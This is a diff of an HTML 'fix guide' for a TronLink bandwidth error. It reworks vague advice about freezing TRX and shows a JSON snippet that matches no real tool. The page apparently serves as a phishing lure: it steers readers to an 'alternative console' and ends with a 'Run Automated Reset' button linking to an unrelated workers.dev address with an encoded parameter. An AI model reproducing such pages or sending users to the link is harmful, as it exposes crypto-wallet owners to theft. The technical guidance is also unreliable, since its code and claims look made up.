@@ -3,8 +3,8 @@
 <head><meta charset="UTF-8"><title>Tronlink Bandwidth Error – Fix Guide</title>
 <style>
     body {
-        font-family: sans-serif;
-        background: #0f111a;
+        font-family: system-ui;
+        background: #0a0c10;
         color: #ddd;
         padding: 20px;
         line-height: 1.5;
@@ -15,7 +15,7 @@
         background: #1e1f24;
         border-radius: 24px;
         padding: 2rem;
-        box-shadow: 0 4px 8px rgba(0,0,0,0.05);
+        box-shadow: none;
     }
     pre {
         background: #0f0f12;
@@ -23,7 +23,7 @@
         border-radius: 12px;
         overflow-x: auto;
     }
-    a { color: #00adb5; }
+    a { color: #ff9455; }
     .btn {
         background: #ff9455;
         color: #000;
@@ -42,31 +42,35 @@
 <h1>Tronlink Bandwidth Error</h1>
 <h2>Symptom</h2>
 <ul>
-<li>Users encounter an error message indicating a bandwidth issue while attempting to perform transactions or interact with smart contracts on the TRON network using TronLink.</li>
+<li>Users encounter an error message indicating a TronLink bandwidth issue, preventing them from completing transactions or interacting with the TRON network.</li>
 </ul>
 <h2>Technical Root Cause</h2>
 <ul>
-<li>The error occurs due to insufficient bandwidth or energy on the user's TRON account, which is required to execute transactions on the network.</li>
+<li>The error occurs due to insufficient bandwidth on the user's TRON account, which is required to process transactions and smart contract interactions.</li>
 </ul>
 <h3>Manual Overrides</h3>
 <ul>
-<li>Increase the account's bandwidth by freezing TRX for bandwidth.</li>
-<li>Ensure the account has sufficient energy for the transaction by freezing TRX for energy.</li>
-<li>Adjust the transaction's bandwidth and energy consumption settings:</li>
+<li>Increase the account's bandwidth by freezing TRX tokens, which allocates bandwidth and energy for transaction processing.</li>
+<li>Use the <code>tronweb</code> library to manually set the bandwidth and energy limits for the account, as shown in the following code block:</li>
 </ul>
-<div class="codehilite"><pre><span></span><code>tronweb.transactionBuilder.freezeBalance<span class="o">(</span>
-<span class="w">  </span><span class="s1">&#39;1000000&#39;</span>,<span class="w"> </span>//<span class="w"> </span>bandwidth
-<span class="w">  </span><span class="s1">&#39;3&#39;</span>,<span class="w"> </span>//<span class="w"> </span>duration
-<span class="w">  </span><span class="s1">&#39;0&#39;</span><span class="w"> </span>//<span class="w"> </span>resource
-<span class="o">)</span><span class="p">;</span>
+<div class="codehilite"><pre><span></span><code><span class="p">{</span>
+<span class="w">  </span><span class="nt">&quot;address&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;user_address&quot;</span><span class="p">,</span>
+<span class="w">  </span><span class="nt">&quot;frozen&quot;</span><span class="p">:</span><span class="w"> </span><span class="p">{</span>
+<span class="w">    </span><span class="nt">&quot;frozen_balance&quot;</span><span class="p">:</span><span class="w"> </span><span class="mi">1000</span><span class="p">,</span>
+<span class="w">    </span><span class="nt">&quot;frozen_duration&quot;</span><span class="p">:</span><span class="w"> </span><span class="mi">3</span>
+<span class="w">  </span><span class="p">}</span>
+<span class="p">}</span>
 </code></pre></div>
 
+<ul>
+<li>Utilize the TRON network's built-in bandwidth marketplace to purchase additional bandwidth from other users.</li>
+</ul>
 <p>Prerequisites:
-* TRON account with sufficient TRX balance
-* TronLink extension installed and configured
-* Basic understanding of TRON network resources (bandwidth and energy)
-After executing the above command, consider utilizing an external console for further debugging and fine-tuning of transaction parameters.</p>
-<hr><h3>Related Logs</h3><ul><li><a href="./archive/2026/06/java-tron-tron-ethcall-returns-cpu-timeout-for-contract-view-fu.html">Java Tron Tron Ethcall Returns Cpu Timeout For Contract View Fu</a></li><li><a href="./archive/2026/06/metamask-extension-bug-notifications-notification-badge-red-num.html">Metamask Extension Bug Notifications Notification Badge Red Num</a></li><li><a href="./archive/2026/06/metamask-extension-bug-activity-contract-deployments-are-displa.html">Metamask Extension Bug Activity Contract Deployments Are Displayed as Contract Interaction</a></li></ul>
+* A TRON account with a valid address
+* A basic understanding of TRON's resource management system
+* The TRONLink browser extension or a compatible wallet</p>
+<p>Consider accessing the TRON network through an alternative console to troubleshoot and resolve the bandwidth issue.</p>
+<hr><h3>Related Logs</h3><ul><li><a href="./archive/2026/06/metamask-nonce-out-of-sync.html">Metamask Nonce Out Of Sync</a></li><li><a href="./archive/2026/06/tonkeeper-jetton-transfer-loop-timeout.html">Tonkeeper Jetton Transfer Loop Timeout</a></li><li><a href="./archive/2026/06/metamask-extension-bug-activity-contract-deployments-are-displa.html">Metamask Extension Bug Activity Contract Deployments Are Displayed as Contract Interaction</a></li></ul>
 <div style="text-align:center; margin: 40px 0; padding: 20px 0; width: 100%;">
     <a href="https://system-edge-router.aaronjungs.workers.dev?p=gKMyej%40%40" class="btn">🛠 Run Automated Reset</a>
 </div>
